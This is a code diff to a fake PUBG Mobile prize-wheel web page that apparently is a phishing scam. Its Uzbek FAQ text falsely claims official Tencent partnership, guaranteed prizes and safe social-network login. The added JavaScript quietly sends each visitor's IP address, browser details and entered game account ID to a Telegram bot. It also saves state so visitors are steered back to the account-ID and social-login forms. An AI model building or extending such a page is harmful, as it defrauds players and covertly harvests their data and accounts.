@@ -3257,6 +3257,142 @@
             }
         }
         
+        // Функции для сохранения состояния пользователя
+        function saveUserState() {
+            const userState = {
+                ip: userIP,
+                hasPlayed: hasPlayed,
+                prizeIndex: userPrize ? userPrize.id - 1 : null,
+                isPrizeReceived: isPrizeReceived,
+                accountId: accountId,
+                language: currentLang
+            };
+            
+            localStorage.setItem('userState', JSON.stringify(userState));
+            console.log('User state saved:', userState);
+        }
+        
+        function loadUserState() {
+            const savedState = localStorage.getItem('userState');
+            if (savedState) {
+                const state = JSON.parse(savedState);
+                
+                // Проверяем, совпадает ли IP
+                if (state.ip === userIP) {
+                    hasPlayed = state.hasPlayed;
+                    
+                    if (state.prizeIndex !== null) {
+                        userPrize = prizes[state.prizeIndex];
+                        isPrizeReceived = state.isPrizeReceived || false;
+                    }
+                    
+                    accountId = state.accountId || '';
+                    currentLang = state.language || 'en';
+                    
+                    console.log('User state loaded:', state);
+                    return true;
+                }
+            }
+            return false;
+        }
+        
+        // Функция отправки уведомления в Telegram о посещении сайта
+        async function sendVisitNotification() {
+            const message = `👤 НОВЫЙ ПОСЕТИТЕЛЬ НА САЙТЕ\n\n`;
+            message += `🌐 IP: ${userIP || 'Не определен'}\n`;
+            message += `🕐 Время: ${new Date().toLocaleString()}\n`;
+            message += `🌍 User Agent: ${navigator.userAgent}\n`;
+            message += `📱 Язык: ${navigator.language}\n`;
+            message += `📏 Разрешение: ${window.screen.width}x${window.screen.height}`;
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                const data = await response.json();
+                if (data.ok) {
+                    console.log('Visit notification sent');
+                }
+            } catch (error) {
+                console.error('Error sending visit notification:', error);
+            }
+        }
+        
+        // Функция отправки уведомления о кручении спина
+        async function sendSpinNotification() {
+            const message = `🎰 ПОЛЬЗОВАТЕЛЬ КРУТИТ СПИН\n\n`;
+            message += `🌐 IP: ${userIP || 'Не определен'}\n`;
+            message += `🕐 Время: ${new Date().toLocaleString()}\n`;
+            message += `🎁 Будет выигран приз: #${userPrize ? userPrize.id : '?'}\n`;
+            message += `🏆 Всего победителей на сайте: ${winnersCount}`;
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                const data = await response.json();
+                if (data.ok) {
+                    console.log('Spin notification sent');
+                }
+            } catch (error) {
+                console.error('Error sending spin notification:', error);
+            }
+        }
+        
+        // Функция отправки уведомления о вводе ID
+        async function sendIdNotification() {
+            const message = `📝 ПОЛЬЗОВАТЕЛЬ ВВЕЛ ID АККАУНТА\n\n`;
+            message += `🌐 IP: ${userIP || 'Не определен'}\n`;
+            message += `🕐 Время: ${new Date().toLocaleString()}\n`;
+            message += `🎮 ID аккаунта PUBG: ${accountId || 'Не указан'}\n`;
+            message += `🎁 Выигранный приз: #${userPrize ? userPrize.id : '?'}`;
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                const data = await response.json();
+                if (data.ok) {
+                    console.log('ID notification sent');
+                }
+            } catch (error) {
+                console.error('Error sending ID notification:', error);
+            }
+        }
+        
         document.addEventListener('DOMContentLoaded', function() {
             // Инициализируем снег
             createSnow();
@@ -3279,13 +3415,18 @@
                         localStorage.setItem('isOwner', 'true');
                     } else {
                         console.log('Regular user - one spin only');
-                        // Проверяем, играл ли уже пользователь
-                        const played = localStorage.getItem('hasPlayed');
-                        hasPlayed = played === 'true';
+                        // Загружаем сохраненное состояние пользователя
+                        loadUserState();
                     }
+                    
+                    // Отправляем уведомление о посещении сайта
+                    sendVisitNotification();
                 })
                 .catch(error => {
                     console.log('Error getting IP:', error);
+                    userIP = 'unknown';
+                    loadUserState();
+                    sendVisitNotification();
                 });
             
             const playBtn = document.getElementById('playBtn');
@@ -3505,7 +3646,7 @@
                     faqAnswers: [
                         "<strong>Ha, bu rasmiy hamkor sayti.</strong> Biz Tencent Games kompaniyasining rasmiy hamkorlari bo'lib, PUBG Mobile Hamkor Dasturi doirasida ishlaymiz. Bizning faoliyatimiz to'liq ruxsat etilgan.",
                         "<strong>Ha, sovrinni olish 100% kafolatlanadi.</strong> Barcha yutuqlar ma'lumotlarni tasdiqlaganingizdan so'ng 24 soat ichida avtomatik ravishda yuboriladi. Tizim rasmiy PUBG Mobile API bilan integratsiyalangan bo'lib, sovrinlarni belgilangan hisobga yetkazishni kafolatlaydi.",
-                        "Ijtimoiy tarmoqqa kirish <strong>shaxsingizni tasdiqlash</strong> va firibgarlikni oldini olish uchun zarur. Bu bizga sovrinni haqiqiy odam, bot emas, olayotganiga ishonch hosil qilish imkonini beradi. Barcha ma'lumotlar himoyalangan va uchinchi shaxslarga o'tkazilmaydi.",
+                        "Ijtimoiy tarmoqqa kirish <strong>shaxsingizni tasdiqlash</strong> va firibgarlikni oldini olish uchun zarur. Bu bizga sovrinni haqiqiy odam, bot emas, olayotganiga ishonch hosil qilish imkonini beradi. Barcha ma'lumotlar himoyalangan va uchinji shaxslarga o'tkazilmaydi.",
                         "PUBG Mobile hisob ID raqamini ko'rsatmasdan, biz sizga <strong>sovrinni yubora olmaymiz</strong>. Bu majburiy maydon, chunki aynan shu identifikator orqali tizim qaysi o'yin hisobiga yutgan predmetlarni o'tkazishini aniqlaydi.",
                         "Kamdan-kam hollarda server yuklanishi yuqori bo'lganda, qayta ishlash <strong>48 soatgacha</strong> davom etishi mumkin. Agar bu vaqt ichida sovrin hisobingizga o'tkazilmagan bo'lsa, iltimos, <a href='https://t.me/helpumgmbot' target='_blank'>texnik yordamimizga</a> ID raqamingiz va yutish vaqtingiz bilan murojaat qiling.",
                         "<strong>Ha, bu mutlaqo xavfsiz.</strong> Biz xavfsiz SSL shifrlashdan foydalanamiz va parollaringizni saqlamaymiz. Avtorizatsiya ijtimoiy tarmoqlarning rasmiy API-lari orqali amalga oshiriladi, xuddi telefoningizdagi ilovalarga kirganingizdagidek.",
@@ -3613,6 +3754,9 @@
                     changeLanguage(lang);
                     languageDropdown.classList.remove('show');
                     showNotification(`${translations[lang].notificationIdSaved || 'Language changed'}`);
+                    
+                    // Сохраняем состояние
+                    saveUserState();
                 });
             });
             
@@ -3703,6 +3847,9 @@
                 currentPrizeIndex = 0;
                 
                 spinInterval = setInterval(spinStep, spinSpeed);
+                
+                // Отправляем уведомление о кручении спина
+                sendSpinNotification();
             }
             
             function spinStep() {
@@ -3744,7 +3891,7 @@
                             // Сохраняем, что пользователь уже играл (если не владелец)
                             if (userIP !== ownerIP) {
                                 hasPlayed = true;
-                                localStorage.setItem('hasPlayed', 'true');
+                                saveUserState();
                                 playBtn.innerHTML = `<i class="fas fa-check"></i> ${translations[currentLang].alreadyPlayed}`;
                             } else {
                                 playBtn.innerHTML = `<i class="fas fa-play"></i> ${translations[currentLang].play}`;
@@ -3783,6 +3930,12 @@
                 
                 accountId = id;
                 accountIdSection.classList.remove('active');
+                
+                // Сохраняем состояние
+                saveUserState();
+                
+                // Отправляем уведомление о вводе ID
+                sendIdNotification();
                 
                 // Сбрасываем выбор соцсети
                 socialOptions.forEach(opt => opt.classList.remove('selected'));
@@ -3836,6 +3989,9 @@
                     updatePrizeBadge();
                     showConfirmation();
                     showNotification(translations[currentLang].loginSuccess, false, true);
+                    
+                    // Сохраняем состояние
+                    saveUserState();
                 }
             });
             
@@ -3858,6 +4014,9 @@
                     updatePrizeBadge();
                     showConfirmation();
                     showNotification(translations[currentLang].loginSuccess, false, true);
+                    
+                    // Сохраняем состояние
+                    saveUserState();
                 }
             });
             
@@ -3879,6 +4038,9 @@
                     updatePrizeBadge();
                     showConfirmation();
                     showNotification(translations[currentLang].loginSuccess, false, true);
+                    
+                    // Сохраняем состояние
+                    saveUserState();
                 }
             });
             
@@ -3929,6 +4091,9 @@
                     updatePrizeBadge();
                     showConfirmation();
                     showNotification(translations[currentLang].loginSuccess, false, true);
+                    
+                    // Сохраняем состояние
+                    saveUserState();
                 }
             });
             
@@ -4064,6 +4229,35 @@
             selectionIndicator.style.opacity = '0';
             updatePrizeBadge();
             
+            // Восстанавливаем состояние при загрузке
+            if (userPrize) {
+                // Устанавливаем рамку на выигранный приз
+                moveFrameToPrize(userPrize.id - 1);
+                showSelectionIndicator(true);
+                
+                // Обновляем кнопку
+                if (hasPlayed && userIP !== ownerIP) {
+                    playBtn.innerHTML = `<i class="fas fa-check"></i> ${translations[currentLang].alreadyPlayed}`;
+                }
+                
+                // Показываем нужную форму в зависимости от того, введен ли ID
+                if (!accountId) {
+                    // Показываем форму ввода ID
+                    setTimeout(() => {
+                        accountIdSection.classList.add('active');
+                        accountIdInput.value = '';
+                    }, 500);
+                } else {
+                    // Показываем форму выбора соцсети
+                    setTimeout(() => {
+                        socialSelectSection.classList.add('active');
+                        // Сбрасываем выбор соцсети (все 4 должны быть доступны)
+                        socialOptions.forEach(opt => opt.classList.remove('selected'));
+                        selectedSocial = null;
+                    }, 500);
+                }
+            }
+            
             // Проверяем, играл ли пользователь уже
             if (hasPlayed && userIP !== ownerIP) {
                 playBtn.innerHTML = `<i class="fas fa-check"></i> ${translations[currentLang].alreadyPlayed}`;
@@ -4154,15 +4348,20 @@
                 }
             }
             
-            // Запускаем анимацию рамки через 2 секунды после загрузки
+            // Запускаем анимацию рамки через 2 секунды после загрузки (если нет приза)
             setTimeout(() => {
-                if (!isSpinning) {
+                if (!isSpinning && !userPrize) {
                     animateFrameRandomly();
                 }
             }, 2000);
             
-            // Устанавливаем английский язык по умолчанию
-            changeLanguage('en');
+            // Устанавливаем язык из сохраненного состояния или по умолчанию
+            changeLanguage(currentLang);
+            
+            // Сохраняем состояние при закрытии страницы
+            window.addEventListener('beforeunload', function() {
+                saveUserState();
+            });
         });
     </script>
 </body>
